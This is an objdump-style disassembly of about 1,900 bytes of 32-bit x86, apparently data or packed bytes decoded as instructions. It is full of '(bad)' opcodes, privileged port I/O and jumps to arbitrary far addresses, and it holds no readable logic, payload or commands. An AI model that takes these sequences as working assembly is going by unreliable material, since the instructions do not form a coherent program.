  40d559:	push   ecx
  40d55a:	(bad)  
  40d55b:	jns    0x40d524
  40d55d:	add    DWORD PTR [esi],edx
  40d55f:	or     al,0x75
  40d561:	sub    esi,DWORD PTR [edi+0x65bc2fc1]
  40d567:	and    al,0xd0
  40d569:	mov    cl,BYTE PTR [ebx-0x74fb9e89]
  40d56f:	fidivr DWORD PTR [edx+0x380de56c]
  40d575:	mov    edi,0x2d745594
  40d57a:	inc    ebx
  40d57b:	mov    cl,0x99
  40d57d:	mov    esp,0x2ac2a5f4
  40d582:	cmp    ah,BYTE PTR [eax]
  40d584:	push   eax
  40d585:	xor    BYTE PTR [edx+0x7dedf36b],0xfe
  40d58c:	sub    BYTE PTR [eax+0x75],dl
  40d58f:	add    ebp,ecx
  40d591:	push   edi
  40d592:	xchg   ecx,eax
  40d593:	xor    eax,0xecc7054b
  40d598:	les    esi,FWORD PTR [eax]
  40d59a:	pop    ebp
  40d59b:	bound  eax,QWORD PTR [ebx-0x58706237]
  40d5a1:	jg     0x40d590
  40d5a3:	es stos DWORD PTR es:[edi],eax
  40d5a5:	aad    0xd7
  40d5a7:	into   
  40d5a8:	push   cs
  40d5a9:	popa   
  40d5aa:	xchg   ecx,eax
  40d5ab:	mov    esp,0x4484c31
  40d5b0:	es clc 
  40d5b2:	pushf  
  40d5b3:	add    eax,0xf209c1a8
  40d5b8:	(bad)  
  40d5b9:	push   edi
  40d5ba:	std    
  40d5bb:	(bad)  
  40d5bc:	ins    DWORD PTR es:[edi],dx
  40d5bd:	inc    esi
  40d5be:	sbb    edx,ecx
  40d5c0:	push   esp
  40d5c1:	scas   al,BYTE PTR es:[edi]
  40d5c2:	mov    bl,0xae
  40d5c4:	out    0x4b,eax
  40d5c6:	and    BYTE PTR [ebx+0x6a4da034],dh
  40d5cc:	xchg   esp,eax
  40d5cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d5ce:	pop    ebx
  40d5cf:	cli    
  40d5d0:	ins    BYTE PTR es:[edi],dx
  40d5d1:	mov    WORD PTR [ebx+0x5b],gs
  40d5d4:	jp     0x40d5ab
  40d5d6:	inc    esi
  40d5d7:	inc    esi
  40d5d8:	jnp    0x40d60c
  40d5da:	xlat   BYTE PTR ds:[ebx]
  40d5db:	clc    
  40d5dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d5dd:	and    dl,BYTE PTR [edx+0x5c]
  40d5e0:	nop
  40d5e1:	div    dh
  40d5e3:	aas    
  40d5e4:	out    dx,al
  40d5e5:	daa    
  40d5e6:	xor    eax,0x15aa3319
  40d5eb:	inc    eax
  40d5ec:	sbb    al,0x2
  40d5ee:	es add al,0xfb
  40d5f1:	sbb    al,0xa5
  40d5f3:	imul   edi,DWORD PTR [edx],0xac2dc0c2
  40d5f9:	stos   BYTE PTR es:[edi],al
  40d5fa:	adc    BYTE PTR [ebx],al
  40d5fc:	les    edx,FWORD PTR [ecx-0x1]
  40d5ff:	and    al,0xea
  40d601:	test   eax,0x1d2d0594
  40d606:	mov    BYTE PTR [eax+ecx*2],cl
  40d609:	add    BYTE PTR [ecx+0x77],ah
  40d60c:	popf   
  40d60d:	dec    edi
  40d60e:	shl    BYTE PTR [edx],1
  40d610:	sbb    eax,0xb1428a27
  40d615:	xchg   DWORD PTR [eax+0x7e],eax
  40d618:	jg     0x40d687
  40d61a:	aas    
  40d61b:	lods   eax,DWORD PTR ds:[esi]
  40d61c:	mov    ds:0xdb159b7a,eax
  40d621:	fcmovbe st,st(3)
  40d623:	pushf  
  40d624:	out    dx,al
  40d625:	sbb    DWORD PTR ds:0x952fca23,esp
  40d62b:	mov    al,ds:0x9ed402b1
  40d630:	ret    0x3d33
  40d633:	dec    ebx
  40d634:	and    BYTE PTR [esi],dh
  40d636:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d637:	je     0x40d6b0
  40d639:	stos   DWORD PTR es:[edi],eax
  40d63a:	xchg   ebp,eax
  40d63b:	dec    ecx
  40d63c:	pop    ds
  40d63d:	inc    esi
  40d63e:	cmc    
  40d63f:	cld    
  40d640:	mov    ah,0xae
  40d642:	sub    esp,DWORD PTR [esp+esi*8+0x23b8f210]
  40d649:	mov    dl,0x7a
  40d64b:	jbe    0x40d5fa
  40d64d:	mov    ah,0x9d
  40d64f:	idiv   DWORD PTR [ebx-0x71]
  40d652:	gs sbb eax,0x433fa288
  40d658:	jmp    0xb2368304
  40d65d:	outs   dx,DWORD PTR gs:[esi]
  40d65f:	lods   eax,DWORD PTR ds:[esi]
  40d660:	cmp    esi,DWORD PTR [edi+ecx*8-0x3ed4b326]
  40d667:	sub    al,0x9c
  40d669:	sbb    al,BYTE PTR [edi-0xa]
  40d66c:	pop    ds
  40d66d:	xchg   ebx,eax
  40d66e:	inc    ebx
  40d66f:	(bad)  
  40d671:	retf   
  40d672:	cmp    cl,BYTE PTR [ebx-0x30f0ea5]
  40d678:	xchg   ebp,eax
  40d679:	sbb    bh,BYTE PTR [edi+0x3c]
  40d67c:	add    dl,BYTE PTR [eax+0x4e19c2a9]
  40d682:	outs   dx,DWORD PTR ds:[esi]
  40d683:	and    BYTE PTR [eax+ebp*1+0x45],dl
  40d687:	call   0x8a0a9584
  40d68c:	adc    eax,0x24dc480b
  40d691:	repnz push ebp
  40d693:	shl    BYTE PTR [ebx-0x6f],1
  40d696:	imul   esp,DWORD PTR [ecx+0x4150d04e],0xfffffff2
  40d69d:	add    DWORD PTR [edi],edi
  40d69f:	shr    DWORD PTR [esi-0x38dcad8e],1
  40d6a5:	jl     0x40d6cb
  40d6a7:	pop    ecx
  40d6a8:	das    
  40d6a9:	sar    ecx,1
  40d6ab:	mov    ch,0x91
  40d6ad:	and    edi,DWORD PTR [edi-0x14]
  40d6b0:	inc    esp
  40d6b1:	cmp    eax,0xf90d068a
  40d6b6:	push   0x59955e7a
  40d6bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d6bc:	adc    BYTE PTR [esi-0x7],al
  40d6bf:	inc    ebp
  40d6c0:	sti    
  40d6c1:	cwde   
  40d6c2:	(bad)  
  40d6c3:	das    
  40d6c4:	sub    DWORD PTR [ebx],ecx
  40d6c6:	or     al,0x6c
  40d6c8:	ja     0x40d738
  40d6ca:	(bad)  
  40d6cb:	cmp    ecx,DWORD PTR [edi-0x50e92129]
  40d6d1:	(bad)  
  40d6d3:	sti    
  40d6d4:	es ss pop ebx
  40d6d7:	xor    bh,BYTE PTR [eax+0x39083220]
  40d6dd:	jp     0x40d6ab
  40d6df:	sub    al,0xfe
  40d6e1:	xchg   al,bl
  40d6e3:	mov    ds:0x741187c4,eax
  40d6e8:	cmp    DWORD PTR [edx+0x1b25ee5d],ebp
  40d6ee:	jmp    0xa5418221
  40d6f3:	jnp    0x40d751
  40d6f5:	data16 mov ds:0x8ad2922d,al
  40d6fb:	test   eax,0x9a4cefeb
  40d700:	xchg   ebp,eax
  40d701:	cmp    al,0x36
  40d703:	imul   eax,DWORD PTR [esi-0x7],0x654f1180
  40d70a:	and    al,0xbf
  40d70c:	(bad)  
  40d70d:	or     eax,0xb19a825b
  40d712:	pop    edx
  40d713:	out    0x74,eax
  40d715:	add    ebp,DWORD PTR ds:0xf73ffbec
  40d71b:	call   0x5762025
  40d720:	push   esp
  40d721:	ret    0xd179
  40d724:	xor    edx,DWORD PTR [edx-0x6]
  40d727:	daa    
  40d728:	pop    esp
  40d729:	mov    esp,0x5663493e
  40d72e:	mov    cl,0x29
  40d730:	or     bl,BYTE PTR [ecx]
  40d732:	call   0x1ae:0x3edf6a4d
  40d739:	out    0x6a,eax
  40d73b:	pop    esp
  40d73c:	icebp  
  40d73d:	setno  BYTE PTR [ebp-0x57]
  40d741:	mov    ah,0xf2
  40d743:	xchg   esp,eax
  40d744:	in     al,dx
  40d745:	stc    
  40d746:	sbb    al,0x38
  40d748:	cmp    esp,ecx
  40d74a:	in     eax,0xdf
  40d74c:	fwait
  40d74d:	mov    ds:0xe17f74aa,eax
  40d752:	in     eax,0xea
  40d754:	push   ebx
  40d755:	xchg   ecx,eax
  40d756:	inc    edi
  40d757:	pop    es
  40d758:	dec    ecx
  40d759:	dec    edi
  40d75a:	xchg   esp,eax
  40d75b:	das    
  40d75c:	add    BYTE PTR [edi],dl
  40d75e:	dec    edi
  40d75f:	not    ch
  40d761:	pop    eax
  40d762:	fstp   DWORD PTR [esi]
  40d764:	in     al,0x31
  40d766:	rol    DWORD PTR [edi-0x72],1
  40d769:	lahf   
  40d76a:	xchg   esp,eax
  40d76b:	mov    ecx,0xf8067a5
  40d770:	mov    ds:0x6dd8abcb,al
  40d775:	or     bh,BYTE PTR [ecx]
  40d777:	sbb    esp,ebp
  40d779:	(bad)  
  40d77a:	sbb    BYTE PTR [eax+0x37],bh
  40d77d:	mov    ecx,0xf11fb208
  40d782:	xchg   ecx,eax
  40d783:	push   ebp
  40d784:	inc    esi
  40d785:	pop    ebp
  40d787:	cmp    eax,0x2fa0b3a7
  40d78c:	and    ch,cl
  40d78e:	neg    al
  40d790:	(bad)  
  40d791:	into   
  40d792:	pusha  
  40d793:	add    eax,0xbd7f85a6
  40d798:	push   ebp
  40d799:	loope  0x40d7cc
  40d79b:	or     bl,BYTE PTR [eax+ecx*4-0x7ae8047d]
  40d7a2:	pop    ds
  40d7a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d7a4:	add    DWORD PTR [ebx-0x3a],0x320ffff1
  40d7ab:	fnstenv [edx-0x786e4bdd]
  40d7b1:	pop    es
  40d7b2:	js     0x40d7fb
  40d7b4:	popa   
  40d7b5:	nop
  40d7b6:	dec    edi
  40d7b7:	add    DWORD PTR [esi],esp
  40d7b9:	cmp    esp,eax
  40d7bb:	and    al,0x28
  40d7bd:	and    BYTE PTR [edx-0x7f594dd9],dl
  40d7c3:	xlat   BYTE PTR ds:[ebx]
  40d7c4:	jo     0x40d783
  40d7c6:	inc    edi
  40d7c7:	and    al,0x60
  40d7c9:	mov    ebp,0xe87b35cf
  40d7ce:	push   ebp
  40d7cf:	fsubr  QWORD PTR [esi]
  40d7d1:	push   edi
  40d7d2:	inc    edx
  40d7d3:	push   esp
  40d7d4:	call   0xbb04e5ce
  40d7d9:	pop    esi
  40d7da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d7dc:	mov    BYTE PTR [edx],bh
  40d7de:	and    BYTE PTR [edx-0x1c12fe8b],0xf4
  40d7e5:	and    ch,BYTE PTR ds:0xfff4d3b3
  40d7eb:	ds jmp 0x55f52561
  40d7f1:	scas   al,BYTE PTR es:[edi]
  40d7f2:	mov    eax,0x5f5fcf5
  40d7f7:	ins    DWORD PTR es:[edi],dx
  40d7f8:	cmc    
  40d7f9:	inc    ecx
  40d7fa:	popf   
  40d7fb:	and    BYTE PTR [edx+0x19],dh
  40d7fe:	ds push ss
  40d800:	adc    DWORD PTR [edx],edi
  40d802:	or     BYTE PTR [ebx-0x74577cca],0xbe
  40d809:	loop   0x40d7ce
  40d80b:	cwde   
  40d80c:	jle    0x40d857
  40d80e:	pop    edx
  40d80f:	shr    dl,1
  40d811:	add    al,0xc6
  40d813:	cdq    
  40d814:	fiadd  WORD PTR [eax-0x38]
  40d817:	cld    
  40d818:	push   cs
  40d819:	inc    esp
  40d81a:	les    eax,FWORD PTR [ebx-0x1977ac5]
  40d820:	or     DWORD PTR [eax+0x50b95df1],0xccb98127
  40d82a:	jg     0x40d817
  40d82c:	cli    
  40d82d:	fstp   st(5)
  40d82f:	lock adc esp,DWORD PTR [eax+0x6ce12b8]
  40d836:	mov    edx,0x8ab7195b
  40d83b:	lods   eax,DWORD PTR ds:[esi]
  40d83c:	xchg   ebp,eax
  40d83d:	cdq    
  40d83e:	dec    eax
  40d83f:	imul   eax,DWORD PTR [esi],0xab3ab624
  40d845:	adc    eax,0x7ba2418a
  40d84a:	add    ah,BYTE PTR [edx+0x5c0fbf3f]
  40d850:	pop    es
  40d851:	xchg   ebp,eax
  40d852:	jecxz  0x40d883
  40d854:	fbld   TBYTE PTR [esi+ebx*4]
  40d857:	ret    0xf409
  40d85a:	add    BYTE PTR [edx],ch
  40d85c:	pop    edi
  40d85d:	in     al,dx
  40d85e:	add    BYTE PTR [ebx+0x622df286],dh
  40d864:	lods   al,BYTE PTR ds:[esi]
  40d865:	push   esi
  40d866:	call   0xbc0d:0xa36ae8f0
  40d86d:	inc    ebx
  40d86e:	sbb    dh,dl
  40d870:	(bad)  
  40d872:	retf   
  40d873:	xor    DWORD PTR [ecx+eax*2],esi
  40d876:	in     al,dx
  40d877:	sahf   
  40d878:	test   eax,0xa198e9ee
  40d87d:	repnz add ch,BYTE PTR [ecx-0x71851c1f]
  40d884:	mov    ecx,eax
  40d886:	dec    esi
  40d887:	xor    al,0x89
  40d88a:	lock fwait
  40d88c:	jmp    0xe4ad:0x88019d09
  40d893:	sbb    DWORD PTR [ebx-0x1c60f489],eax
  40d899:	jp     0x40d862
  40d89b:	loop   0x40d850
  40d89d:	lock rol bh,cl
  40d8a0:	mov    al,ds:0xaa456b91
  40d8a5:	add    eax,0xab1c442
  40d8aa:	mov    bl,0xab
  40d8ac:	mov    dl,0xab
  40d8ae:	mov    edx,0x55a02f76
  40d8b3:	int3   
  40d8b4:	out    0x82,eax
  40d8b6:	pop    ebx
  40d8b7:	mov    ebp,0x90a4be4e
  40d8bc:	push   cs
  40d8bd:	pop    ebp
  40d8be:	sub    al,0x82
  40d8c0:	inc    edi
  40d8c1:	cmp    bl,BYTE PTR [bx-0x2450]
  40d8c6:	int3   
  40d8c7:	sbb    DWORD PTR [edx-0x4e],ecx
  40d8ca:	loop   0x40d916
  40d8cc:	fmul   DWORD PTR [esi-0x73a2aea2]
  40d8d2:	stc    
  40d8d3:	pop    eax
  40d8d4:	xchg   esi,eax
  40d8d5:	int    0x76
  40d8d7:	push   cs
  40d8d8:	stos   DWORD PTR es:[edi],eax
  40d8d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d8da:	mov    ds:0x3d7e7309,eax
  40d8df:	inc    edi
  40d8e0:	out    0x3b,eax
  40d8e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d8e3:	mov    esi,0x300f8001
  40d8e8:	repnz (bad) 
  40d8ea:	packuswb mm2,QWORD PTR [esi+ecx*1+0x52]
  40d8ef:	jbe    0x40d888
  40d8f1:	and    eax,ecx
  40d8f3:	cmp    DWORD PTR [edi-0x735b8a49],esi
  40d8f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d8fa:	add    BYTE PTR [ebp+0x67],0xc6
  40d8fe:	retf   0x8652
  40d901:	data16 sub ch,BYTE PTR [esi+eiz*2+0x7e]
  40d906:	cwde   
  40d907:	inc    esi
  40d908:	mov    esp,0x4f498b5b
  40d90d:	cmp    cl,BYTE PTR [ecx-0x2d]
  40d910:	or     eax,0x2d525de5
  40d915:	mov    ebp,0xd773060c
  40d91a:	hlt    
  40d91b:	lahf   
  40d91c:	cmp    ebx,DWORD PTR [esi-0x2]
  40d91f:	xor    eax,0x1fea4341
  40d924:	in     eax,dx
  40d925:	(bad)  
  40d926:	(bad)  
  40d927:	sub    ax,0xd9c6
  40d92b:	cwde   
  40d92c:	pop    edi
  40d92d:	enter  0xcf96,0x40
  40d931:	dec    esp
  40d932:	mov    bh,BYTE PTR [ebp-0xb]
  40d935:	mov    ebp,0xc22e1224
  40d93a:	push   edi
  40d93b:	mov    ebx,0xa9032510
  40d940:	cdq    
  40d941:	in     eax,dx
  40d942:	out    dx,eax
  40d943:	dec    edx
  40d944:	ss inc ebp
  40d946:	pop    edi
  40d947:	cmp    bh,BYTE PTR [edx-0x2d2095a]
  40d94d:	clc    
  40d94e:	and    eax,0x5650d06b
  40d953:	(bad)
  40d956:	mov    ?,WORD PTR [edi+0xd73fe8c]
  40d95c:	ret    
  40d95d:	pop    ds
  40d95e:	jo     0x40d9d0
  40d960:	std    
  40d961:	add    eax,0xe2289463
  40d966:	or     eax,0xc689d570
  40d96b:	sbb    eax,0xec5efdb
  40d970:	sub    ah,BYTE PTR [ebx+0x5dd57fe9]
  40d976:	push   ds
  40d977:	push   ds
  40d978:	pop    esi
  40d979:	imul   edx,DWORD PTR [ebx+esi*4],0xc097a713
  40d980:	out    0x78,eax
  40d982:	xchg   ebp,eax
  40d983:	push   es
  40d984:	repnz pop esi
  40d986:	pop    ss
  40d987:	hlt    
  40d988:	pushf  
  40d989:	pop    esi
  40d98a:	add    ebx,edx
  40d98c:	push   0x9bdf40fe
  40d991:	ja     0x40d96d
  40d993:	cs jmp 0x7193:0x99911b56
  40d99b:	xchg   ebx,eax
  40d99c:	xchg   DWORD PTR [ebx+edx*4-0x55874777],ebp
  40d9a3:	xchg   ebp,eax
  40d9a4:	pop    ecx
  40d9a5:	lds    esp,FWORD PTR [edi+0x4a05573b]
  40d9ab:	pop    ecx
  40d9ac:	jbe    0x40d93e
  40d9ae:	mov    esp,0xa6c867e1
  40d9b3:	(bad)  
  40d9b5:	lods   eax,DWORD PTR ds:[esi]
  40d9b6:	xchg   bh,bh
  40d9b8:	repnz sbb bh,ah
  40d9bb:	jmp    0x40d963
  40d9bd:	call   0x4265:0x3b083a12
  40d9c4:	sbb    DWORD PTR [ebx],eax
  40d9c6:	inc    edx
  40d9c7:	aam    0xa1
  40d9c9:	xchg   esi,eax
  40d9ca:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d9cc:	ds int 0x93
  40d9cf:	pop    ebp
  40d9d0:	out    0xe2,eax
  40d9d2:	and    eax,0x10e946ce
  40d9d7:	inc    ebx
  40d9d8:	ds mov edi,0xfb82278b
  40d9de:	fcmovnu st,st(0)
  40d9e0:	sti    
  40d9e1:	add    eax,0xb5b1f453
  40d9e6:	sub    ecx,DWORD PTR [eax+eax*4+0x5cbd628d]
  40d9ed:	mov    eax,ds:0xc0a78053
  40d9f2:	shl    BYTE PTR [ebp-0xe54f523],cl
  40d9f8:	popa   
  40d9f9:	xchg   ebp,eax
  40d9fa:	cmp    eax,0xb8efc253
  40d9ff:	jnp    0x40d9d7
  40da01:	aam    0xf7
  40da03:	leave  
  40da04:	xor    esp,DWORD PTR [ebx+edi*8]
  40da07:	jl     0x40d9a9
  40da09:	dec    ebp
  40da0a:	push   cs
  40da0b:	ficomp WORD PTR [ebx]
  40da0d:	dec    edi
  40da0e:	test   BYTE PTR [ebp-0x5b834185],al
  40da14:	stc    
  40da15:	call   0xb36a:0x6ccb60e0
  40da1c:	sbb    al,0x52
  40da1e:	lock sbb al,0x57
  40da21:	mov    cl,0x3c
  40da23:	ret    
  40da24:	mov    bl,0x27
  40da26:	cwde   
  40da27:	data16 adc cl,BYTE PTR ds:[ebx+0x11]
  40da2c:	mov    BYTE PTR [eax],ch
  40da2e:	sbb    bl,BYTE PTR ds:0x98000333
  40da34:	out    dx,eax
  40da35:	stos   DWORD PTR es:[edi],eax
  40da36:	icebp  
  40da37:	popf   
  40da38:	xor    eax,0xfaa41ff0
  40da3d:	daa    
  40da3e:	push   esi
  40da3f:	in     al,0x1e
  40da41:	fldcw  WORD PTR [ecx-0x3b2156ea]
  40da47:	inc    ebx
  40da48:	std    
  40da49:	popf   
  40da4a:	(bad)  
  40da4b:	fneni(8087 only) 
  40da4d:	xchg   esp,eax
  40da4e:	adc    DWORD PTR [edi+0x13],ebp
  40da51:	push   eax
  40da52:	outs   dx,BYTE PTR ds:[esi]
  40da53:	xchg   DWORD PTR [edx+0x4f],ebx
  40da56:	sbb    eax,0x50885066
  40da5b:	popa   
  40da5c:	sub    ecx,DWORD PTR [esi+0x65f61b35]
  40da62:	and    esp,ecx
  40da64:	jge    0x40da8a
  40da66:	data16 std 
  40da68:	(bad)
  40da6b:	stos   BYTE PTR es:[edi],al
  40da6c:	inc    esp
  40da6d:	call   0x9bb1:0x1b0460fc
  40da74:	bound  eax,QWORD PTR [esi]
  40da76:	imul   BYTE PTR [ebp+edx*2-0x5f4fdcc1]
  40da7d:	(bad)  
  40da7e:	mov    bh,0xc
  40da80:	outs   dx,BYTE PTR ds:[esi]
  40da81:	push   ecx
  40da82:	and    al,0x68
  40da84:	in     eax,0xe6
  40da86:	shl    DWORD PTR [edx-0x4c],cl
  40da89:	xchg   ebx,eax
  40da8a:	add    BYTE PTR [eax],ch
  40da8c:	pushf  
  40da8d:	mov    ebp,edi
  40da8f:	stos   BYTE PTR es:[edi],al
  40da90:	mov    edi,DWORD PTR [edx+0x7da491a]
  40da96:	out    dx,al
  40da97:	push   ds
  40da98:	(bad)  
  40da99:	stos   DWORD PTR es:[edi],eax
  40da9a:	jo     0x40dabd
  40da9c:	retf   
  40da9d:	call   0x2e13:0x3ae10b47
  40daa4:	(bad)  
  40daa5:	in     al,dx
  40daa6:	call   0x7a9e:0xca2d910d
  40daad:	nop
  40daae:	mov    dl,0xd8
  40dab0:	retf   0x460d
  40dab3:	sar    BYTE PTR [ebx+edi*4],0x10
  40dab7:	arpl   cx,dx
  40dab9:	push   esp
  40daba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dabb:	jno    0x40dabe
  40dabd:	in     al,0xab
  40dabf:	add    BYTE PTR [ebx-0x4fbd6efb],dh
  40dac5:	and    ah,BYTE PTR [ebx+0x49ade148]
  40dacb:	xor    al,0x5d
  40dacd:	sar    BYTE PTR [ebp+ecx*1+0x730b62e2],0x9a
  40dad5:	or     DWORD PTR [esi+0x72095d38],esi
  40dadb:	mov    esp,0x9010f474
  40dae0:	push   ebp
  40dae1:	xor    ch,cl
  40dae3:	xchg   dh,bh
  40dae5:	retf   0x21ad
  40dae8:	jge    0x40db3d
  40daea:	sar    BYTE PTR [esi-0x1f],cl
  40daed:	ds or  cl,0x59
  40daf1:	gs aas 
  40daf3:	neg    ebp
  40daf5:	mov    eax,0xfbb74a8f
  40dafa:	les    esp,FWORD PTR [edx+0xd]
  40dafd:	loop   0x40db4e
  40daff:	fisttp QWORD PTR [edi]
  40db01:	push   cs
  40db02:	inc    edi
  40db03:	test   DWORD PTR [ebp-0x4a05ebb5],ecx
  40db09:	mov    ch,0x99
  40db0b:	imul   cx,WORD PTR [esi-0x7b],0x32
  40db10:	fsubrp st(6),st
  40db12:	pop    edi
  40db13:	sbb    eax,DWORD PTR [ecx-0x21075004]
  40db19:	mov    ds:0xf8181a6c,eax
  40db1e:	xchg   ebx,eax
  40db1f:	call   0x8d51e565
  40db24:	pop    ebp
  40db25:	xor    DWORD PTR [ecx],eax
  40db27:	sbb    al,0xe1
  40db29:	mov    ah,0x28
  40db2b:	stos   BYTE PTR es:[edi],al
  40db2c:	icebp  
  40db2d:	jecxz  0x40daf5
  40db2f:	add    ecx,esp
  40db31:	sbb    BYTE PTR [edx+ecx*8-0x7b],bl
  40db35:	in     eax,0x72
  40db37:	in     eax,dx
  40db38:	std    
  40db39:	sbb    edx,edx
  40db3b:	out    0x54,al
  40db3d:	jmp    0x40dba1
  40db3f:	cmp    BYTE PTR [edi+0x63776577],ah
  40db45:	xchg   ecx,eax
  40db46:	stos   DWORD PTR es:[edi],eax
  40db47:	out    dx,eax
  40db48:	inc    esi
  40db49:	jp     0x40db30
  40db4b:	adc    BYTE PTR [ecx+0x1e1f6f0c],bh
  40db51:	sbb    edx,DWORD PTR [edi+eax*4+0x380d9032]
  40db58:	or     eax,0x8375ab6a
  40db5d:	out    dx,al
  40db5e:	test   eax,0x6f4e8294
  40db63:	mov    BYTE PTR [esi+0x44e6bfdf],dh
  40db69:	push   ebx
  40db6a:	xchg   ebp,eax
  40db6b:	push   esp
  40db6c:	sub    al,0xfa
  40db6e:	dec    edx
  40db6f:	int3   
  40db70:	push   0xffffffff
  40db72:	and    eax,0xb9e9d5b4
  40db77:	in     al,0xfe
  40db79:	ds sbb eax,0xf9258e0e
  40db7f:	je     0x40dbd6
  40db81:	pop    edx
  40db82:	(bad)  
  40db83:	sub    al,0x92
  40db85:	or     eax,0x60c2ed7d
  40db8a:	es pushf 
  40db8c:	out    dx,al
  40db8d:	ret    
  40db8e:	push   ds
  40db8f:	aad    0xd8
  40db91:	jb     0x40db32
  40db93:	jno    0x40dbed
  40db95:	and    eax,0x3545afb7
  40db9a:	popa   
  40db9b:	push   esp
  40db9c:	(bad)  
  40db9d:	push   esi
  40db9e:	(bad)  
  40db9f:	sbb    ebx,edi
  40dba1:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  40dba3:	loope  0x40db88
  40dba5:	xor    edx,ebx
  40dba7:	or     ah,BYTE PTR [edx-0x5]
  40dbaa:	or     DWORD PTR [edx-0x131d62a8],0xffffffb4
  40dbb1:	int3   
  40dbb2:	push   ebp
  40dbb3:	and    BYTE PTR [edi],ch
  40dbb5:	lods   al,BYTE PTR ds:[esi]
  40dbb6:	mov    ecx,0x3bac69d2
  40dbbb:	push   ds
  40dbbc:	and    DWORD PTR [esi+esi*1-0xf],edx
  40dbc0:	int    0x12
  40dbc2:	xor    ch,BYTE PTR [eax+0x5551dd5b]
  40dbc8:	cs dec ebp
  40dbca:	inc    ebp
  40dbcb:	sub    bl,al
  40dbcd:	mov    DWORD PTR [edx],edi
  40dbcf:	xchg   ebx,eax
  40dbd0:	cli    
  40dbd1:	lods   eax,DWORD PTR ds:[esi]
  40dbd2:	jo     0x40dc09
  40dbd4:	fiadd  DWORD PTR [ecx-0x5]
  40dbd7:	fidivr WORD PTR [esi]
  40dbd9:	shl    al,0x25
  40dbdc:	or     edi,DWORD PTR [edi]
  40dbde:	or     al,0xf7
  40dbe0:	fcom   DWORD PTR [edx+0x1ce60518]
  40dbe6:	mov    dh,0x39
  40dbe8:	add    al,0xca
  40dbea:	fsubr  QWORD PTR [ecx-0x31]
  40dbed:	jge    0x40dbaa
  40dbef:	out    0x2e,eax
  40dbf1:	xchg   edi,eax
  40dbf2:	add    ecx,DWORD PTR [eiz*8+0xbe4b54e]
  40dbf9:	and    BYTE PTR [ebx+0x32],ah
  40dbfc:	les    ecx,FWORD PTR ds:0x911df6a
  40dc02:	scas   al,BYTE PTR es:[edi]
  40dc03:	mov    ds:0xea64acd7,eax
  40dc08:	lahf   
  40dc09:	outs   dx,DWORD PTR ds:[esi]
  40dc0a:	jge    0x40dbf3
  40dc0c:	jl     0x40dc36
  40dc0e:	das    
  40dc0f:	clc    
  40dc10:	inc    edi
  40dc11:	and    BYTE PTR [edx-0x65],0x49
  40dc15:	popa   
  40dc16:	pop    ebx
  40dc17:	add    DWORD PTR [eax-0x4a461db7],ebp
  40dc1d:	loop   0x40dbcb
  40dc1f:	adc    BYTE PTR [ebp+0xcdc1ddd],al
  40dc25:	in     eax,0x19
  40dc27:	and    al,0x64
  40dc29:	test   BYTE PTR [ebx],ch
  40dc2b:	xchg   edi,eax
  40dc2c:	jno    0x40dca9
  40dc2e:	mov    ch,0x21
  40dc30:	pop    ss
  40dc31:	xor    ah,BYTE PTR [edx+0x70df73d9]
  40dc37:	jno    0x40dbf9
  40dc39:	in     eax,dx
  40dc3a:	cmp    al,0xd4
  40dc3c:	lods   al,BYTE PTR ds:[esi]
  40dc3d:	call   0x2a14d035
  40dc42:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  40dc44:	test   DWORD PTR [ebp+0x7b315f4f],edi
  40dc4a:	pusha  
  40dc4b:	les    ebx,FWORD PTR [ebp+0x1d]
  40dc4e:	fwait
  40dc4f:	sbb    al,0x1
  40dc51:	div    DWORD PTR ds:0x70ef2853
  40dc57:	daa    
  40dc58:	push   esi
  40dc59:	xor    ebp,DWORD PTR [edx]
  40dc5b:	fidivr WORD PTR [ecx+0x6c]
  40dc5e:	adc    dl,BYTE PTR [eax+0x25dbfc80]
  40dc64:	or     edi,DWORD PTR [ecx+0x68]
  40dc67:	out    dx,al
  40dc68:	std    
  40dc69:	or     BYTE PTR [edi+edx*2],bh
  40dc6c:	(bad)  
  40dc6e:	inc    eax
  40dc6f:	push   cs
  40dc70:	mov    BYTE PTR [eax],0xd7
  40dc73:	popa   
  40dc74:	inc    ebp
  40dc75:	dec    ebx
  40dc76:	imul   eax,DWORD PTR [esi],0x1521e8c9
  40dc7c:	push   0x9de652fe
  40dc81:	test   al,0xfa
  40dc83:	int    0x5f
  40dc85:	pop    ecx
  40dc86:	pop    ds
  40dc87:	mov    edi,0x78622734
  40dc8c:	fdiv   st,st(7)
  40dc8e:	adc    BYTE PTR [ecx],bl
  40dc90:	add    BYTE PTR [eax-0x768a61f9],dh
  40dc96:	mov    edi,0xc0f1e1c
  40dc9b:	lds    eax,FWORD PTR [edi+0x17]
  40dc9e:	cdq    
  40dc9f:	ds xor eax,0xea2efd03
  40dca5:	fnstenv [ebp-0x41]
  40dca8:	mov    ds:0x813d9696,al
  40dcad:	dec    esp
  40dcae:	call   0xd142:0x5769a9a7
  40dcb5:	imul   esi,DWORD PTR [ecx+0x33],0x1cf3169b
  40dcbc:	lea    edx,[ecx-0x412d3716]
  40dcc2:	lods   eax,DWORD PTR ds:[esi]
  40dcc3:	mov    ah,0xe
  40dcc5:	jbe    0x40dcea
  40dcc7:	inc    ebp
  40dcc8:	adc    BYTE PTR [ecx-0x22aef1ab],ah
  40dcce:	sar    DWORD PTR [edx],1
  40dcd0:	pop    ebx
  40dcd1:	aaa    
  40dcd2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dcd3:	aad    0x55
  40dcd5:	fwait
  40dcd6:	imul   edi,DWORD PTR [ecx],0x79320c40
  40dcdc:	fnstenv [eax-0x51]
  40dcdf:	mov    al,ds:0xbcf2fbe7
  40dce4:	cli    
  40dce5:	cld    
  40dce6:	mov    edx,0xff0ff27f
  40dceb:	mov    ds:0xeba51621,eax
  40dcf0:	sbb    eax,esi
